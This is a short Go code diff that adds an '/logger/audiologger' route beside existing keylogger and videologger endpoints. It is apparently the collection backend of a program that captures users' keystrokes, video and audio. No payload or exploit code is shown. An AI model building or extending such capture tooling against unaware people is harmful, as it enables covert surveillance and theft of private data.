@@ -64,6 +64,7 @@ func main() {
 	router.Static("/assets", "./assets")
 	router.POST("/logger/keylogger", Logger.KeyLogger)
 	router.POST("/logger/videologger", Logger.VideoLogger)
+	router.POST("/logger/audiologger", Logger.AudioLogger)
 
 	Logger.AutoMigrate()
 
